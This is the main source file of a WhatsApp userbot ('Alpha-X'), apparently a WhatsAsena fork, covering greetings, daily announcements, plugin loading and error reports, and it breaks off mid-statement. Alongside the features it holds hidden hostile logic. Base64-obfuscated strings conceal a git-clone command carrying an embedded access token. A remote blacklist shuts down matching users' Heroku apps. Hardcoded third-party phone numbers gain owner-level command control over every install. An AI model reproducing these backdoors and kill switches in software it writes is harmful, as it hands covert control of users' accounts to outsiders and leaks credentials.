const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./alphaX/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const AlphaXnpm = require('alpha-wabot-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const AlphaXdb = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94772978164,0,94763983965,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function AlphaxBot () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const AlphaxCN = new WAConnection();
    const Session = new StringSession();
    AlphaxCN.version = [2, 2147, 16]
    AlphaxCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      AlphaxCN.connectOptions.agent = ProxyAgent(config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await AlphaXnpm.daily_announcement(config.LANG)
        var ann = await AlphaXnpm.ann()
        while (getGMTh == 18 && getGMTm == 0) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '╰──╮• Günlük Duyurular •╭──╯\n\n'
            if (config.LANG == 'AZ') ilan = '╰──╮• Gündəlik Elanlar •╭──╯\n\n'
            if (config.LANG == 'EN') ilan = '╰──╮• Daily Announcements •╭──╯\n\n'
            if (config.LANG == 'ES') ilan = '╰──╮• Anuncios Diarios •╭──╯\n\n'
            if (config.LANG == 'PT') ilan = '╰──╮• Anúncios Diários •╭──╯\n\n,'
            if (config.LANG == 'RU') ilan = '╰──╮• Ежедневные объявления •╭──╯\n\n'
            if (config.LANG == 'ML') ilan = '╰──╮• പ്രതിദിന പ്രഖ്യാപനങ്ങൾ •╭──╯\n\n'
            if (config.LANG == 'HI') ilan = '╰──╮• दैनिक घोषणा •╭──╯\n\n'
            if (config.LANG == 'ID') ilan = '╰──╮• Pengumuman Harian •╭──╯\n\n'
            if (config.LANG == 'SI') ilan = '╰──╮• දෛනික නිවේදන •╭──╯\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', AlphaxCN.user.name).replace('{wa_version}', AlphaxCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', AlphaxCN.user.phone.os_version).replace('{device_model}', AlphaxCN.user.phone.device_model).replace('{device_brand}', AlphaxCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', AlphaxCN.user.name).replace('{wa_version}', AlphaxCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', AlphaxCN.user.phone.os_version).replace('{device_model}', AlphaxCN.user.phone.device_model).replace('{device_brand}', AlphaxCN.user.phone.device_manufacturer)})
                } else {
                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, ilan + ann_msg.replace('{user}', AlphaxCN.user.name).replace('{wa_version}', AlphaxCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', AlphaxCN.user.phone.os_version).replace('{device_model}', AlphaxCN.user.phone.device_model).replace('{device_brand}', AlphaxCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    
async function asynchronous_ch() {}

    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await AlphaXnpm.timezone(AlphaxCN.user.jid)
            var date_bio = await AlphaXnpm.datebio(config.LANG)
            const biography = '📆 ' + date_bio + '\n⏳ ' + timezone_bio + '\n\n' + config.BIONAME
            await AlphaxCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await AlphaXdb.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    AlphaxCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        AlphaxCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        AlphaxCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    AlphaxCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('🔓 Login Information Updated!')
        );
        const authInfo = AlphaxCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await AlphaXdb.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })

/*    const numbers = AlphaxCN.user.jid
      AlphaXnpm.check_num(numbers);
*/

    AlphaxCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('🏂 Ａｌｐｈａ-Ｘ-WA-Bot ')}${chalk.blue.bold('Running...')}
${chalk.white.bold('🏁 Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('🔄 Connecting to WhatsApp...')}`);
    });
    AlphaxCN.on('open', async () => {
        console.log(
            chalk.green.bold('⛓️ Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('📶️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                      require('./plugins/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('❌ Some Plugins Are Corrupted: ' + plugin.dataValues.name)
          }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('🗂️ Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let wtype = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🛸 Ａｌｐｈａ-Ｘ-WA-Bot ' + wtype));
        if (AlphaxCN.user.jid == one || AlphaxCN.user.jid == two || AlphaxCN.user.jid == three || AlphaxCN.user.jid == four || AlphaxCN.user.jid == five || AlphaxCN.user.jid == six || AlphaxCN.user.jid == seven || AlphaxCN.user.jid == eight) {
            await AlphaxCN.sendMessage(AlphaxCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.AI_LILY == 'true') {
            var lily_msg = await AlphaXnpm.lily_if(config.LANG)
            await AlphaxCN.sendMessage(AlphaxCN.user.jid, lily_msg, MessageType.text)
        }
        else {
            var af_start = await AlphaXnpm.work_type(config.WORKTYPE, config.LANG)
            await AlphaxCN.sendMessage(AlphaxCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await AlphaxCN.sendMessage(
                AlphaxCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '⌛️ [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await AlphaXnpm.update(config.LANG)
            await AlphaxCN.sendMessage(AlphaxCN.user.jid, up_ch, MessageType.text)
        }
    })
    AlphaxCN.on("chat-update", async (m) => {
     
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await AlphaxCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ===================
        
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // goodbye 
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let ppUrl
                try { ppUrl = await AlphaxCN.getProfilePicture(msg.messageStubParameters[0]); } catch { ppUrl = await AlphaxCN.getProfilePicture(msg.key.remoteJid); }                    
                var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})

                    await AlphaxCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{pp}', '‎').replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name), mimetype: Mimetype.png, thumbnail: Buffer.from(resim.data) })
                    
                } else if (gb.message.includes('{gif}')) {
                    var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid)
                    let resim
                    try { resim = await axios.get(`${config.GBYE_GIF}`, {responseType: 'arraybuffer'}) } catch { resim = await AlphaxCN.getProfilePicture(msg.key.remoteJid); }

                    await AlphaxCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.video, { caption: gb.message.replace('{gif}', '‎').replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name), mimetype: Mimetype.gif })

                } else {
                    var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid) 
                await AlphaxCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name) , MessageType.text)
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // welcome 
            var gb = await getMessage(msg.key.remoteJid);
             if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let ppUrl
                try { ppUrl = await AlphaxCN.getProfilePicture(msg.messageStubParameters[0]); } catch { ppUrl = await AlphaxCN.getProfilePicture(msg.key.remoteJid); }                    
                var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid)
                    var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})

                    await AlphaxCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{pp}', '‎').replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name), mimetype: Mimetype.png, thumbnail: Buffer.from(resim.data) })
                    
                } else if (gb.message.includes('{gif}')) {
                    var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid)
                    let resim
                    try { resim = await axios.get(`${config.WLCM_GIF}`, {responseType: 'arraybuffer'}) } catch { resim = await AlphaxCN.getProfilePicture(msg.key.remoteJid); }

                    await AlphaxCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.video, { caption: gb.message.replace('{gif}', '‎').replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name), mimetype: Mimetype.gif })

                } else {
                    var nwjson = await AlphaxCN.groupMetadata(msg.key.remoteJid) 
                await AlphaxCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', AlphaxCN.user.name) , MessageType.text)
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('@g.us') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.BOTHELP == '120363023256845651') {     
            var sup = config.BOTHELP.split(',');                            
            if(msg.key.remoteJid.includes('@g.us') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.COMMUNITY == '120363022626781816') {     
            var sup = config.COMMUNITY.split(',');                            
            if(msg.key.remoteJid.includes('@g.us') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }

        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = AlphaxCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('@g.us')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('@g.us')) sendMsg = true;
                    }
                    if ((OWN.ff == "94772978164,0,94763983965,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('@g.us')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('@g.us')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await AlphaxCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(AlphaxCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(AlphaxCN, msg);
                        } else {
                            whats = new Message(AlphaxCN, msg);
                        }
                        
                        if (msg.key.fromMe && command.deleteCommand && !msg.key.remoteJid.includes('@g.us')) {
                          await whats.delete()                          
                        } 
                        
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                     
                       catch (error) {
                            if (config.NOLOG == 'true') return;
                            if (config.LANG == 'SI') {
                                await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 දෝෂ වාර්තාව [ Ａｌｐｈａ-Ｘ ] 📨*\n' + 
                                    '\n*⚙ Ａｌｐｈａ-Ｘ හි දෝෂයක් සිදු වී ඇත!*'+
                                    '\n_♦ මෙම දෝෂ ලඝු සටහනට ඔබේ අංකය හෝ විරුද්ධවාදියෙකුගේ අංකය ඇතුළත් විය හැකිය. කරුණාකර එය සමඟ ප්‍රවේශම් වන්න!_' +
                                    '\n_🛸 ඔබට අපගේ වට්සැප් කණ්ඩායමට උදව් සඳහා ලිවිය හැකිය ._' +
                                    '\n_*https://chat.whatsapp.com/ItIRSBUMN9t2lQzCpfAKWt*' +
                                    '\n_මෙම පණිවිඩය ඔබගේ අංකයට යා යුතුව තිබුණි (සුරැකි පණිවිඩ)._\n' +
                                    '\n*දෝෂය:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: false}
                                );
                                if (error.message.includes('URL')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Only Absolutely URLs Supported_' +
                                        '\n*⚖️ හේතුව:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*🛡️ විසඳුම:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Deleting Plugin_' +
                                        '\n*⚖️ හේතුව:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*🛡️ විසඳුම:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Split of Undefined_' +
                                        '\n*⚖️ හේතුව:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*🛡️ විසඳුම:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _SQL Database Error_' +
                                        '\n*⚖️ හේතුව:* _Database corruption._ ' +
                                        '\n*🛡️ විසඳුම:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Ookla Server Connection_' +
                                        '\n*⚖️ හේතුව:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*🛡️ විසඳුම:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Requested Audio Params_' +
                                        '\n*⚖️ හේතුව:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*🛡️ විසඳුම:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _No Such File or Directory_' +
                                        '\n*⚖️ හේතුව:* _Incorrect coding of the plugin._' +
                                        '\n*🛡️ විසඳුම:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Error 404 HTTPS_' +
                                        '\n*⚖️ හේතුව:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*🛡️ විසඳුම:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*⚖️ හේතුව:* _Using IMG or Wiki commands._' +
                                        '\n*🛡️ විසඳුම:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                        '\n*⚖️ හේතුව:* _Using IMG or Wiki commands._' +
                                        '\n*🛡️ විසඳුම:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Bailyes Action Error_ ' +
                                        '\n*⚖️ හේතුව:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*🛡️ විසඳුම:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Cannot Decode Text or Media_' +
                                        '\n*⚖️ හේතුව:* _Incorrect use of the plug._' +
                                        '\n*🛡️ විසඳුම:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🚀 දෝෂ විශ්ලේෂණය [ Ａｌｐｈａ-Ｘ ] 🚧*\n' + 
                                        '\n========== _Error Resolved!_ ==========' +
                                        '\n\n*🛠 ප්‍රධාන දෝෂය:* _Word Character Usage_' +
                                        '\n*⚖️ හේතුව:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*🛡️ විසඳුම:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🙇🏻 සමාවන්න! මට මෙම දෝශය කියවිය නොහැක 🙇🏻*' +
                                        '\n_උපසදෙස් සඳහා ඔබට අපගේ සහය කන්ඩායමට එක්විය හැහ_'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                                await AlphaxCN.sendMessage(AlphaxCN.user.jid, '*🔭 ERROR REPORT [ Ａｌｐｈａ-Ｘ ] ⚖️*\n' + 
                                    '\n*⚙ Ａｌｐｈａ-Ｘ an error has occurred!*'+
